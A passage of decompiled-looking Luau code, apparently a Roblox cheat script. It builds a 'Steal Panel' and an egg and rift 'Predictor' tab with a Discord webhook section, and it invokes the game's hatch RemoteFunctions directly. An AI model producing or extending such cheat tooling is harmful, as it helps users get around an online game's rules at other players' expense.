			scrollingFrame.Size = UDim2.new(scrollingFrame.Size.X.Scale, scrollingFrame.Size.X.Offset, n26 - n29, 0)
			scrollingFrame.Position = UDim2.new(scrollingFrame.Position.X.Scale, scrollingFrame.Position.X.Offset, n29 + (n26 - n29) * y2, 0)
			local clone = unequip:Clone()
			clone.AnchorPoint = Vector2.new(0, 0.5)
			clone.Position = UDim2.new(0, 0, 0.5, 0)
			clone.Size = UDim2.new(0.37, 0, 1, 0)
			clone.Parent = frame2
			local v22 = fn20(clone)
			fn22(v22)

			clone.Activated:Connect(function()
				local v23 = v4
				local flag9 = v4

				if v23 then
					flag9 = type(v23.Set) == "function"
				end

				if flag9 then
					pcall(v23.Set, v23, not tbl4.Toggle(v23, false))
				end

				task.defer(fn30)
			end)

			local frame3 = v9.GrowingEggs and v9.GrowingEggs:FindFirstChild("Frame")
			frame3 = frame3 and frame3:FindFirstChild("ScrollingFrame")
			frame3 = frame3 and frame3:FindFirstChild("Template")
			frame3 = frame3 and frame3:FindFirstChild("Spacer")
			frame3 = frame3 and frame3:FindFirstChild("Progress")
			frame3 = frame3 and fn15(frame3) or nil
			local fill = frame3 and frame3:FindFirstChild("Fill")
			local textLabel2 = frame3 and frame3:FindFirstChild("TextLabel")

			if not (frame3 and fill and textLabel2) then
				if frame3 then
					frame3:Destroy()
				end

				frame3 = Instance.new("Frame")
				frame3.BackgroundColor3 = color2(17, 17, 22)
				frame3.BackgroundTransparency = 0.25
				frame3.BorderSizePixel = 0
				fill = Instance.new("Frame")
				fill.BackgroundColor3 = color2(78, 255, 69)
				fill.BorderSizePixel = 0
				fill.AnchorPoint = Vector2.new(0, 0.5)
				fill.Position = UDim2.new(0, 0, 0.5, 0)
				fill.Parent = frame3
				textLabel2 = Instance.new("TextLabel")
				textLabel2.BackgroundTransparency = 1
				textLabel2.AnchorPoint = Vector2.new(0.5, 0.5)
				textLabel2.Position = UDim2.new(0.5, 0, 0.5, 0)
				textLabel2.TextScaled = true
				textLabel2.TextColor3 = color2(255, 255, 255)
				textLabel2.ZIndex = 3
				textLabel2.Parent = frame3
			end

			frame3.AnchorPoint = Vector2.new(1, 0.5)
			frame3.Position = UDim2.new(1, 0, 0.5, 0)
			frame3.Size = UDim2.new(0.6, 0, 0.8, 0)
			frame3.Active = true
			textLabel2.Size = UDim2.new(0.92, 0, 0.9, 0)
			frame3.Parent = frame2
			tbl10 = { Toggle = v22, Fill = fill, Text = textLabel2 }

			local function fn45(arg)
				return math.clamp(math.floor((100 + math.clamp((arg - frame3.AbsolutePosition.X) / math.max(frame3.AbsoluteSize.X, 1), 0, 1) * 900) / 10 + 0.5) * 10, 100, 1000)
			end

			local function fn46(dragValue)
				if not tbl10 then
					return
				end
				tbl10.DragValue = dragValue
				fn30()

				if tbl10.Sent ~= dragValue then
					tbl10.Sent = dragValue
					local v23 = v5
					local flag9 = v5

					if v23 then
						flag9 = type(v23.Set) == "function"
					end

					if flag9 then
						pcall(v23.Set, v23, dragValue)
					else
						n = dragValue
						n2 = dragValue
					end
				end
			end

			local function fn47(arg)
				return arg.UserInputType == Enum.UserInputType.MouseButton1 or arg.UserInputType == Enum.UserInputType.Touch
			end

			frame3.InputBegan:Connect(function(input)
				if tbl10 and fn47(input) then
					tbl10.Dragging = true
					fn46(fn45(input.Position.X))
				end
			end)

			table.insert(tbl14, UserInputService.InputChanged:Connect(function(input)
				if tbl10 and tbl10.Dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
					fn46(fn45(input.Position.X))
				end
			end))

			table.insert(tbl14, UserInputService.InputEnded:Connect(function(input)
				if tbl10 and tbl10.Dragging and fn47(input) then
					tbl10.Dragging = false
					fn30()
				end
			end))

			local uiGradient = header:FindFirstChildOfClass("UIGradient")

			if uiGradient then
				local v23 = fn8
				local tbl18 = {}
				local tbl19 = { 0, color2(200, 18, 24) }
				local tbl20 = { 0.53, color2(255, 88, 90) }
				local tbl21 = { 1, color2(214, 28, 34) }
				tbl18[1] = tbl19
				tbl18[2] = tbl20
				tbl18[3] = tbl21
				uiGradient.Color = v23(tbl18)
			end

			title = header:FindFirstChild("Title")
			fn12(title, "Steal Panel")
			local plusEquip = header:FindFirstChild("PlusEquip")
			v14 = fn20(plusEquip)

			if v14 then
				fn21(v14, tbl8.Steal)
				fn12(v14.Label, "Sort: " .. tbl7[n15])
				fn22(v14)

				plusEquip.Activated:Connect(function()
					n15 = n15 % #tbl7 + 1
					fn12(v14.Label, "Sort: " .. tbl7[n15])
					fn31()
				end)
			end

			local v23 = fn20(close)
			fn22(v23)

			close.Activated:Connect(function()
				fn41(true, true)
			end)

			local clone2 = unequip:Clone()
			clone2.Name = "Cancel"
			clone2.Parent = spacer
			local uiAspectRatioConstraint2 = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint2.AspectRatio = 1
			uiAspectRatioConstraint2.DominantAxis = Enum.DominantAxis.Height
			uiAspectRatioConstraint2.Parent = clone2
			unequip.Size = UDim2.new(0.24, 0, unequip.Size.Y.Scale, 0)
			unequip.Position = UDim2.new(0.852, 0, 0.5, 0)
			clone2.Size = UDim2.new(0.105, 0, unequip.Size.Y.Scale, 0)
			clone2.Position = UDim2.new(0.965, 0, 0.5, 0)
			local icon = spacer:FindFirstChild("Icon")

			if icon then
				icon.AnchorPoint = Vector2.new(0.5, 0.5)
				icon.Size = UDim2.new(0.2, 0, 1.3, 0)
				icon.Position = UDim2.new(0.1, 0, 0.5, 0)
			end

			textLabel.Size = UDim2.new(0.38, 0, 0.34, 0)
			textLabel.Position = UDim2.new(0.415, 0, 0.24, 0)
			fn12(textLabel, "")
			local clone3 = textLabel:Clone()
			clone3.Name = "Value"
			clone3.Size = UDim2.new(0.38, 0, 0.26, 0)
			clone3.Position = UDim2.new(0.415, 0, 0.56, 0)
			local uiGradient2 = clone3:FindFirstChildOfClass("UIGradient")

			if not uiGradient2 then
				uiGradient2 = Instance.new("UIGradient")
				uiGradient2.Parent = clone3
			end

			uiGradient2.Color = tbl8.Steal.Color
			uiGradient2.Rotation = tbl8.Steal.Rotation
			clone3.Parent = spacer
			local clone4 = clone3:Clone()
			clone4.Name = "Detail"
			clone4.Size = UDim2.new(0.38, 0, 0.22, 0)
			clone4.Position = UDim2.new(0.415, 0, 0.83, 0)
			local uiGradient3 = clone4:FindFirstChildOfClass("UIGradient")

			if uiGradient3 then
				uiGradient3.Color = tbl8.Hud.Color
				uiGradient3.Rotation = tbl8.Hud.Rotation
			end

			clone4.Parent = spacer
			local v24 = fn20(unequip)
			fn12(v24.Label, "Steal")
			fn21(v24, tbl8.Steal)
			local v25 = fn20(clone2)
			fn12(v25.Label, "X")
			fn21(v25, tbl8.Cancel)
			clone2.Position = udim2
			clone2.Visible = false
			unequip.Position = udim22
			unequip.Size = udim23
			local clone5 = clone2:Clone()
			clone5.Name = "Star"
			clone5.AnchorPoint = Vector2.new(1, 0.5)
			clone5.Size = UDim2.new(0.1, 0, 0.56, 0)
			clone5.Position = udim2
			clone5.Visible = true
			clone5.Parent = spacer
			local v26 = fn20(clone5)
			fn12(v26.Label, utf8.char(9733))
			fn21(v26, tbl8.Queued)
			local v27 = ipairs
			local tbl18 = {}
			local tbl19 = {}
			local v28 = utf8.char(9650)
			local n30 = n17 - n16
			tbl19[1] = "Up"
			tbl19[2] = v28
			tbl19[3] = n30
			local tbl20 = {}
			local v29 = utf8.char(9660)
			tbl20[1] = "Down"
			tbl20[2] = v29
			tbl20[3] = n17
			tbl18[1] = tbl19
			tbl18[2] = tbl20

			for _, v30 in v27(tbl18) do
				local clone6 = clone2:Clone()
				clone6.Name = v30[1]
				clone6.AnchorPoint = Vector2.new(1, 0.5)
				clone6.Size = UDim2.new(0.1, 0, 0.56, 0)
				clone6.Position = UDim2.new(v30[3], 0, 0.6, 0)
				clone6.Visible = false
				clone6.Parent = spacer
				local v31 = fn20(clone6)
				fn12(v31.Label, v30[2])
				fn21(v31, tbl8.Hud)
			end

			clone2.AnchorPoint = Vector2.new(1, 0)
			clone2.Position = UDim2.new(0.99, 0, 0.04, 0)
			clone2.Size = UDim2.new(0.06, 0, 0.28, 0)
			clone2.ZIndex = 8

			for _, descendant in ipairs(clone2:GetDescendants()) do
				if descendant:IsA("GuiObject") then
					descendant.ZIndex = descendant.ZIndex + 8
				end
			end

			local clone6 = clone3:Clone()
			clone6.Name = "Rank"
			clone6.AnchorPoint = Vector2.new(0, 0)
			clone6.Position = UDim2.new(0.012, 0, 0.03, 0)
			clone6.Size = UDim2.new(0.1, 0, 0.36, 0)
			clone6.TextXAlignment = Enum.TextXAlignment.Left
			clone6.ZIndex = 6
			clone6.Visible = false
			fn12(clone6, "#1")
			local uiGradient4 = clone6:FindFirstChildOfClass("UIGradient")

			if uiGradient4 then
				uiGradient4.Color = tbl8.PriorityOn.Color
				uiGradient4.Rotation = 90
			end

			clone6.Parent = spacer
			template.Visible = false
			template.Parent = nil
			v16 = template
			v15 = scrollingFrame
			v13 = v21
			position = frame.Position
			v21.Position = position
			fn17(v21, true)
			fn16(v21)
			v12 = createScreenGui(v9.ActivePets)
			v12.Enabled = false
			v21.Parent = v12
			v12.Parent = v3
			table.insert(tbl14, scrollingFrame:GetPropertyChangedSignal("AbsoluteSize"):Connect(fn32))
			table.insert(tbl14, v21:GetPropertyChangedSignal("AbsoluteSize"):Connect(fn19))
			return true
		end

		local function fn45()
			if not flag then
				return
			end
			flag = false
			n12 += 1
			flag5 = false
			flag7 = false

			if flag3 then
				flag3 = false

				if not fn25() then
					fn27(false, true)
				end
			end

			if tween then
				tween:Cancel()
				tween = nil
			end

			tbl5.DisconnectAll(tbl14)
			table.clear(tbl12)
			table.clear(tbl13)

			if v12 then
				v12:Destroy()
			end

			if v16 then
				v16:Destroy()
			end

			v12 = nil
			v13 = nil
			position = nil
			title = nil
			v14 = nil
			v15 = nil
			v16 = nil
			n13 = 0
			tbl10 = nil
			tbl11 = nil
			n14 = 1
			v9 = nil
		end

		fn13 = function()
			if flag then
				return
			end
			local v21 = fn14()

			if not v21 then
				if not flag2 then
					flag2 = true

					task.delay(2, function()
						flag2 = false

						if not flag and tbl4.Toggle(nil, true) then
							fn13()
						end
					end)
				end

				return
			end

			v9 = v21
			flag = true
			n12 += 1
			local v22 = n12
			uiStroke = v9.ActivePets.Frame:FindFirstChildOfClass("UIStroke")
			thickness = uiStroke and uiStroke.Thickness or nil
			tbl15.Panel = thickness or 2.3120369911193848
			local uiStrokeClr = v9.Pets:FindFirstChild("UIStrokeClr")
			tbl15.Hud = uiStrokeClr and uiStrokeClr:IsA("UIStroke") and uiStrokeClr.Thickness or 2.3120369911193848
			if not fn42() or not fn44() then
				fn45()
				return
			end

			if flag4 then
				flag4 = false
				task.spawn(fn40)
			end

			table.insert(tbl14, RunService.RenderStepped:Connect(fn43))

			if uiStroke then
				table.insert(tbl14, uiStroke:GetPropertyChangedSignal("Thickness"):Connect(fn18))
			end

			for _, v23 in ipairs({ v9.ActivePets, v9.GrowingEggs }) do
				if v23 then
					table.insert(tbl14, v23:GetPropertyChangedSignal("Enabled"):Connect(function()
						if v23.Enabled and flag3 then
							fn41(false)
						end
					end))
				end
			end

			local eggState = tbl.EggState

			if type(eggState) == "table" then
				for _, v23 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "FieldClaimed", "SnapshotRefreshed" }) do
					local v24 = eggState[v23]

					if type(v24) == "table" and type(v24.Connect) == "function" then
						local ok, result = pcall(v24.Connect, v24, fn37)

						if ok and result then
							table.insert(tbl14, result)
						end
					end
				end
			end

			local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")

			if areaEggSlotsClient then
				table.insert(tbl14, areaEggSlotsClient.ChildAdded:Connect(fn37))
				table.insert(tbl14, areaEggSlotsClient.ChildRemoved:Connect(fn37))
			end

			task.spawn(function()
				local n20 = 0

				while true do
					if flag and v22 == n12 then
						n20 += task.wait(0.5)

						if not (not flag or v22 ~= n12) then
							if not (v9.Eggs:IsDescendantOf(game) and v9.ActivePets:IsDescendantOf(game)) then
								task.defer(function()
									fn45()

									if tbl4.Toggle(nil, true) then
										fn13()
									end
								end)

								break
							else
								if n3 <= n20 then
									fn37()
									n20 = 0
								elseif flag3 then
									fn31()
								end

								continue
							end
						end
					end

					break
				end
			end)

			task.spawn(pcall, fn39, v22)
		end

		fn4(function()
			fn45()

			if v10 then
				v10:Destroy()
			end

			fn23(nil)
			v10 = nil
			v11 = nil
			imageLabel = nil
		end)

		tbl4.RestoreStealPanel = function()
			if v17:Get() ~= true then
				return
			end

			if flag and v12 and not flag3 then
				task.spawn(fn40)
			else
				flag4 = true
			end
		end
	end

	task.defer(fn13)
	local v18

	do
		local v19 = v2:CreateTab({ Name = "Predictor", SectionsExpanded = true })
		v6 = v19:CreateSection({ Name = "Discord Webhook", Expanded = false })
		v18 = v19:CreateSection({ Name = "Egg Predictor", Expanded = true })
		v7 = v19:CreateSection({ Name = "Rift Predictor", Expanded = true })
		v8 = v19:CreateSection({ Name = "Fuse Predictor", Expanded = false })

		local function fn24(arg, arg2)
			local ok, result = pcall(Font.new, arg, arg2, Enum.FontStyle.Normal)
			return ok and result or nil
		end

		tbl6 = {
			Ready = type(v18.CreateCanvas) == "function",
			Bullet = utf8.char(8226),
			Color = {
				Text = "#FFFFFF",
				Income = "#4DFF7A",
				Clock = "#FFC24D",
				Ready = "#4DFF7A",
				Growing = "#FFC24D",
				Inventory = "#7FD8FF",
				Weight = "#CDE7FF",
				Scale = "#FFDF8A",
				Separator = "#7A8CC0",
				Hint = "#9FB8FF",
			},
			NameFont = fn24("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold),
		}

		tbl6.RarityFont = fn24("rbxassetid://12187365977", Enum.FontWeight.Bold) or fn24("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular)
		local sequence2 = tbl5.Sequence
		local tbl16 = {}
		local tbl17 = { 0, Color3.fromRGB(255, 255, 255) }
		local tbl18 = { 0.5, Color3.fromRGB(222, 238, 255) }
		local tbl19 = { 1, Color3.fromRGB(255, 255, 255) }
		tbl16[1] = tbl17
		tbl16[2] = tbl18
		tbl16[3] = tbl19
		tbl6.NameGradient = sequence2(tbl16)
		local sequence3 = tbl5.Sequence
		local tbl20 = {}
		local tbl21 = { 0, Color3.fromRGB(255, 255, 255) }
		local tbl22 = { 0.2, Color3.fromRGB(206, 212, 224) }
		local tbl23 = { 0.42, Color3.fromRGB(74, 80, 94) }
		local tbl24 = { 0.58, Color3.fromRGB(42, 46, 56) }
		local tbl25 = { 0.78, Color3.fromRGB(158, 166, 182) }
		local tbl26 = { 1, Color3.fromRGB(250, 252, 255) }
		tbl20[1] = tbl21
		tbl20[2] = tbl22
		tbl20[3] = tbl23
		tbl20[4] = tbl24
		tbl20[5] = tbl25
		tbl20[6] = tbl26
		tbl6.SecretGradient = sequence3(tbl20)
		tbl6.SecretRotation = 90

		tbl6.Paint = function(arg, arg2)
			return string.format("<font color=\"%s\">%s</font>", arg, arg2)
		end

		tbl6.Bold = function(arg)
			return "<b>" .. tostring(arg) .. "</b>"
		end

		tbl6.Escape = function(arg)
			return (string.gsub(tostring(arg), "[<>&]", { ["<"] = "&lt;", [">"] = "&gt;", ["&"] = "&amp;" }))
		end

		tbl6.Separator = function()
			return tbl6.Paint(tbl6.Color.Separator, "  " .. tbl6.Bullet .. "  ")
		end

		tbl6.FormatRate = function(arg)
			local n16 = tonumber(arg) or 0
			if n16 >= 1e12 then
				return string.format("%.2fT/s", n16 / 1e12)
			end

			if n16 >= 1e9 then
				return string.format("%.2fB/s", n16 / 1e9)
			end

			if n16 >= 1000000 then
				return string.format("%.2fM/s", n16 / 1000000)
			end

			if n16 >= 1000 then
				return string.format("%.1fK/s", n16 / 1000)
			end
			return string.format("%d/s", math.floor(n16))
		end

		tbl6.FormatWeight = function(arg)
			local n16 = tonumber(arg) or 0
			local str = n16 >= 1000 and string.format("%.0f", n16) or string.format("%.2f", n16)
			local v20, v21 = string.match(str, "^(%-?%d+)(%.%d+)$")
			v20 = v20 or str
			local v22

			while true do
				local v23
				v22, v23 = string.gsub(v20, "^(%-?%d+)(%d%d%d)", "%1,%2")

				if v23 ~= 0 then
					v20 = v22
				else
					break
				end
			end

			return v22 .. (v21 or "") .. " Kg"
		end

		tbl6.FormatClock = function(arg)
			local n16 = math.max(0, math.floor(tonumber(arg) or 0))
			return string.format("%02dh %02dm %02ds", math.floor(n16 / 3600), math.floor(n16 % 3600 / 60), n16 % 60)
		end

		tbl6.ScaleFactor = function(arg)
			if arg > 5 then
				return (arg / 5) ^ 1.2 * 19.637875755794113
			end
			return arg ^ 1.85
		end

		tbl6.MutationMultiplier = function(arg)
			arg = type(arg) == "table" and arg or {}
			local mutations = tbl.Mutations

			if type(mutations) == "table" and type(mutations.EarningsFor) == "function" then
				local ok, result = pcall(mutations.EarningsFor, arg)
				if ok and type(result) == "number" then
					return result
				end
			end

			return 1
		end

		local tbl27 = {
			Golden = "#FFD34D",
			Silver = "#E6EEF7",
			Sakura = "#FF9ED8",
			GreatBloom = "#7CFFC4",
			Boss = "#FF7A7A",
			Monstrous = "#C08BFF",
		}

		local tbl28 = { "#FF6B6B", "#FFB36B", "#FFF06B", "#6BFF8A", "#6BC8FF", "#B96BFF" }

		tbl6.MutationText = function(arg)
			local tbl29 = {}

			if type(arg) == "table" then
				for _, v20 in ipairs(arg) do
					local v21 = string.upper(fn7(v20))

					if v20 == "Rainbow" or v20 == "Prismatic" then
						local tbl30 = {}

						for i = 1, #v21 do
							table.insert(tbl30, tbl6.Paint(tbl28[(i - 1) % #tbl28 + 1], string.sub(v21, i, i)))
						end

						local insert = table.insert
						local v22 = table.pack(tbl6.Bold(table.concat(tbl30)))
						insert(tbl29, table.unpack(v22, 1, v22.n))
					else
						table.insert(tbl29, tbl6.Bold(tbl6.Paint(tbl27[v20] or "#8FE3FF", tbl6.Escape(v21))))
					end
				end
			end

			return table.concat(tbl29, " ")
		end

		local rarityGradients = nil

		local function fn25(arg)
			if type(arg) == "table" and typeof(arg.RarityGradient) == "Instance" then
				return arg.RarityGradient
			end

			if rarityGradients == nil then
				local assets = ReplicatedStorage:FindFirstChild("Assets")
				assets = assets and assets:FindFirstChild("UI")
				rarityGradients = assets and assets:FindFirstChild("RarityGradients") or false
			end

			if not rarityGradients or type(arg) ~= "table" then
				return nil
			end
			local v20 = rarityGradients:FindFirstChild(tostring(arg._id or arg.DisplayName or ""))
			return v20 and v20:FindFirstChild("RarityGradient") or nil
		end

		local tbl29 = {}

		tbl6.AssetInfo = function(arg)
			local category = tostring(arg)
			local v20 = tbl29[category]
			if v20 then
				return v20
			end
			local directory = tbl.Assets and tbl.Assets.Directory
			local flag8 = type(directory) == "table" and directory[category] or nil
			local v21

			if flag8 == nil and type(directory) == "table" then
				local v22 = string.gsub(string.lower(category), "[^%a%d]", "")

				for k, v23 in pairs(directory) do
					local v24

					if type(v23) == "table" then
						local tbl30 = {}
						local str = tostring(k)
						local str2 = tostring(v23._id or "")
						local v25 = tostring
						local displayName = v23.DisplayName or ""
						local v26 = table.pack(v25(displayName))
						tbl30[1] = str
						tbl30[2] = str2

						do
							local values = table.pack(table.unpack(v26, 1, v26.n))
							table.move(values, 1, values.n, 3, tbl30)
						end

						local egg = type(v23.Egg) == "table" and v23.Egg or nil

						if egg ~= nil then
							tbl30[#tbl30 + 1] = tostring(egg.ModelName or "")
						end

						for _, v27 in ipairs(tbl30) do
							if v27 ~= "" and string.gsub(string.lower(v27), "[^%a%d]", "") == v22 then
								flag8 = v23
								break
							end
						end

						v24 = flag8
					else
						v24 = flag8
					end

					if v24 ~= nil then
						flag8 = v24
						break
					else
						flag8 = v24
					end
				end

				v21 = flag8
			else
				v21 = flag8
			end

			local rarity = type(v21) == "table" and type(v21.Rarity) == "table" and v21.Rarity or nil
			local icon = type(v21) == "table" and v21.Icon or nil
			local rarity2

			if rarity then
				rarity2 = tostring(rarity.DisplayName or rarity._id or "Common")
			else
				rarity2 = rarity
			end

			rarity2 = rarity2 or "Common"
			local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or Color3.fromRGB(255, 255, 255)
			local tbl30 = {}
			local name = type(v21) == "table"

			if name then
				name = tostring(v21.DisplayName or category)
			end

			tbl30.Name = name or category
			tbl30.Category = category
			tbl30.Rarity = rarity2
			local rarityNumber

			if rarity then
				rarityNumber = tonumber(rarity.RarityNumber or rarity.Rank)
			else
				rarityNumber = rarity
			end

			tbl30.RarityNumber = rarityNumber or 0
			tbl30.Color = color3
			tbl30.Hex = "#" .. string.upper(color3:ToHex())
			tbl30.Gradient = fn25(rarity)
			tbl30.EarningRate = type(v21) == "table" and tonumber(v21.EarningRate) or 0
			tbl30.Icon = type(icon) == "string" and icon ~= "" and icon or nil
			tbl29[category] = tbl30
			return tbl30
		end

		tbl6.Income = function(arg, arg2, arg3)
			if type(arg2) ~= "number" or arg2 <= 0 then
				return 0
			end
			return math.max(math.round(arg.EarningRate * tbl6.ScaleFactor(arg2) * tbl6.MutationMultiplier(arg3)), 1)
		end

		local function isShown(arg)
			if typeof(arg) ~= "Instance" or not arg:IsDescendantOf(game) then
				return false
			end

			while arg do
				if arg:IsA("GuiObject") and not arg.Visible then
					return false
				end

				if arg:IsA("LayerCollector") then
					return arg.Enabled
				end
				arg = arg.Parent
			end

			return false
		end

		tbl6.PageVisible = function()
			local ok, result = pcall(function()
				return v19.Page
			end)

			if not ok or typeof(result) ~= "Instance" then
				return true
			end
			return isShown(result) and result.AbsoluteSize.X > 0
		end

		tbl6.IsShown = isShown
	end

	local tbl16
	tbl16 = { "Value", "Rarity", "Time Left" }
	local tbl17

	tbl17 = {
		{ Key = "Ready", Title = "READY TO HATCH", Color = tbl6.Color.Ready },
		{ Key = "Growing", Title = "GROWING", Color = tbl6.Color.Growing },
		{ Key = "Inventory", Title = "IN INVENTORY", Color = tbl6.Color.Inventory },
	}

	local n16
	n16 = 1
	local paint
	paint = tbl6.Paint
	local bold
	bold = tbl6.Bold
	local color3
	color3 = tbl6.Color
	local tbl18
	tbl18 = { Sort = tbl16[1], Spotlight = true }
	local id
	id = nil
	local n17
	n17 = 0.0909
	local v19
	v19 = nil
	local tbl19
	tbl19 = {}
	local tbl20
	tbl20 = {}
	local tbl21
	tbl21 = {}
	local tbl22
	tbl22 = {}
	local n18
	n18 = 0
	local n19
	n19 = 0
	local n20
	n20 = 0.06
	local n21, n22, n23, flag8, n24, flag9, n25, flag10, v20, requestEggRefresh

	do
		local n26 = -1
		local n27 = -1
		n21 = -1
		n22 = 4
		n23 = 3
		flag8 = false
		n24 = 0
		flag9 = true
		n25 = 0
		flag10 = false
		v20 = nil

		requestEggRefresh = function()
			flag9 = true
		end

		local function fn24(arg)
			if not arg or arg.DiffWrapped then
				return arg
			end
			local set = arg.Set
			arg.DiffWrapped = true

			arg.Set = function(arg2)
				if type(arg2) ~= "table" then
					return set(arg2)
				end
				local spec = arg.Spec
				local tbl23 = nil

				for k, v21 in pairs(arg2) do
					if spec[k] ~= v21 then
						tbl23 = tbl23 or {}
						tbl23[k] = v21
					end
				end

				if tbl23 then
					set(tbl23)
				end

				return arg
			end

			return arg
		end

		local function fn25(arg, arg2)
			local v21 = string.gsub(tostring(arg.Spec.Text or ""), "%d", "0")
			return tostring(n19) .. "|" .. tostring(arg2) .. "|" .. v21
		end

		local function fn26(arg, arg2)
			local eggRecords = tbl.EggRecords
			if type(eggRecords) ~= "table" or type(eggRecords.GrowthSecondsRemaining) ~= "function" then
				return 0, 0
			end
			local n28 = 1

			if type(eggRecords.GrowthSpeedMultiplier) == "function" then
				local ok
				ok, n28 = pcall(eggRecords.GrowthSpeedMultiplier, arg)
				ok = ok and type(n28) == "number"
				local n29 = 1

				if not ok then
					n28 = n29
				end
			end

			local ok, result = pcall(eggRecords.GrowthSecondsRemaining, arg, arg2, n28)
			ok = ok and type(result) == "number"
			local n29 = 0

			if not ok then
				result = n29
			end

			local n30 = 0

			if type(eggRecords.GrowthDuration) == "function" then
				local ok2
				ok2, n30 = pcall(eggRecords.GrowthDuration, arg)
				ok2 = ok2 and type(n30) == "number"
				local n31 = 0

				if not ok2 then
					n30 = n31
				end
			end

			return result, n30
		end

		local function fn27(arg)
			local eggRecords = tbl.EggRecords

			if type(eggRecords) == "table" and type(eggRecords.WeightKg) == "function" then
				local ok, result = pcall(eggRecords.WeightKg, arg)
				if ok and type(result) == "number" then
					return result
				end
			end

			return 0
		end

		local function fn28()
			local eggState = tbl.EggState
			if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
				return nil
			end
			local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
			if not ok or type(result) ~= "table" then
				return nil
			end
			local serverTimeNow = workspace:GetServerTimeNow()
			local tbl23 = {}

			for k, v21 in pairs(result) do
				if type(v21) == "table" then
					local v22 = tbl6.AssetInfo(v21.AssetCategory)
					local n28 = tonumber(v21.AssetScale) or 0
					local mutations = type(v21.Mutations) == "table" and v21.Mutations or {}

					local tbl24 = {
						Id = k,
						Info = v22,
						Scale = n28,
						Weight = fn27(v21),
						Mutations = mutations,
						Income = tbl6.Income(v22, n28, mutations),
						Status = "Inventory",
						Remaining = math.huge,
						Percent = 0,
					}

					if v21.Placement ~= nil then
						local ok2, result2 = pcall(eggState.IsReadyToHatch, k)

						if ok2 and result2 then
							tbl24.Status = "Ready"
							tbl24.Remaining = 0
							tbl24.Percent = 100
						else
							local v23, v24 = fn26(v21, serverTimeNow)
							tbl24.Status = "Growing"
							tbl24.Remaining = v23

							if v24 > 0 then
								tbl24.Percent = math.clamp(math.floor((1 - v23 / v24) * 100), 0, 100)
							end
						end
					end

					table.insert(tbl23, tbl24)
				end
			end

			return tbl23
		end

		local function fn29(arg)
			local sort = tbl18.Sort

			table.sort(arg, function(arg2, arg3)
				if sort == tbl16[2] and arg2.Info.RarityNumber ~= arg3.Info.RarityNumber then
					return arg2.Info.RarityNumber > arg3.Info.RarityNumber
				end

				if sort == tbl16[3] and arg2.Remaining ~= arg3.Remaining then
					return arg2.Remaining < arg3.Remaining
				end
				return arg2.Income > arg3.Income
			end)
		end

		local function fn30(arg)
			if arg.Status == "Ready" then
				return bold(paint(color3.Ready, "Ready to hatch"))
			end

			if arg.Status == "Growing" then
				return bold(paint(color3.Clock, tbl6.FormatClock(arg.Remaining))) .. tbl6.Separator() .. paint(color3.Growing, arg.Percent .. "%")
			end
			return paint(color3.Inventory, "In inventory")
		end

		local function fn31(arg)
			local tbl23 = {}
			local v21 = tbl6.MutationText(arg.Mutations)
			table.insert(tbl23, bold(paint(color3.Income, tbl6.FormatRate(arg.Income))))
			table.insert(tbl23, paint(color3.Scale, string.format("%.2fx", arg.Scale)))
			table.insert(tbl23, paint(color3.Weight, tbl6.FormatWeight(arg.Weight)))

			if v21 ~= "" then
				table.insert(tbl23, v21)
			end

			return table.concat(tbl23, tbl6.Separator())
		end

		local n28 = 5
		local n29 = n28 + 0.8
		local n30 = 1.2
		local n31 = 1.2
		local n32 = 0.936
		local n33 = 2.3
		local n34 = 0.25
		local n35 = 0.18
		local n36 = n33 + 0.6
		local n37 = 0.24
		local n38 = 0.22

		local function fn32(arg)
			if string.upper(tostring(arg.Rarity)) == "SECRET" then
				return tbl6.SecretGradient
			end
			return arg.Gradient
		end

		local function fn33(arg)
			return fn32(arg) ~= nil and Color3.fromRGB(255, 255, 255) or arg.Color
		end

		local function fn34(arg)
			if string.upper(tostring(arg.Rarity)) == "SECRET" then
				return tbl6.SecretRotation
			end
			return nil
		end

		local function fn35(arg)
			local v21 = arg and arg.Get()
			if not v21 or n19 <= 0 then
				return nil
			end

			if v21.Text ~= tostring(arg.Spec.Text or "") then
				return nil
			end
			return v21
		end

		local function fn36(arg)
			local v21 = fn25(arg, "w")
			if arg.WidthKey == v21 then
				return arg.WidthUnits
			end
			local v22 = fn35(arg)
			if not v22 then
				return nil
			end
			local size = v22.Size
			local textWrapped = v22.TextWrapped
			v22.TextWrapped = false
			v22.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
			local x = v22.TextBounds.X
			v22.Size = size
			v22.TextWrapped = textWrapped
			if x <= 0 then
				return nil
			end
			local widthUnits = x / n19
			arg.WidthKey = v21
			arg.WidthUnits = widthUnits
			return arg.WidthUnits
		end

		local function fn37(arg, arg2)
			local v21 = fn25(arg, math.floor(arg2 * 100 + 0.5))
			if arg.HeightKey == v21 then
				return arg.HeightUnits
			end
			local v22 = fn35(arg)
			if not v22 then
				return nil
			end
			local size = v22.Size
			v22.Size = UDim2.fromOffset(math.max(1, math.floor(arg2 * n19 + 0.5)), 100000)
			local y = v22.TextBounds.Y
			v22.Size = size
			if y <= 0 then
				return nil
			end
			local heightUnits = y / n19
			arg.HeightKey = v21
			arg.HeightUnits = heightUnits
			return arg.HeightUnits
		end

		local function fn38(arg)
			local rfEggWorldAskHatch = networking:FindFirstChild("RF/EggWorld/AskHatch")
			if not rfEggWorldAskHatch or not rfEggWorldAskHatch:IsA("RemoteFunction") then
				return false
			end
			local ok, result = pcall(rfEggWorldAskHatch.InvokeServer, rfEggWorldAskHatch, arg)
			if not ok or result == false then
				return false
			end
			task.wait(0.35)
			local rfEggWorldAskFinishHatch = networking:FindFirstChild("RF/EggWorld/AskFinishHatch")

			if rfEggWorldAskFinishHatch and rfEggWorldAskFinishHatch:IsA("RemoteFunction") then
				pcall(rfEggWorldAskFinishHatch.InvokeServer, rfEggWorldAskFinishHatch, arg)
			end

			return true
		end

		tbl19.RunAction = function()
			local focus = tbl19.Focus
			if type(focus) ~= "table" or focus.Id == nil then
				return
			end
			local str = tostring(focus.Id)

			if focus.Status == "Inventory" then
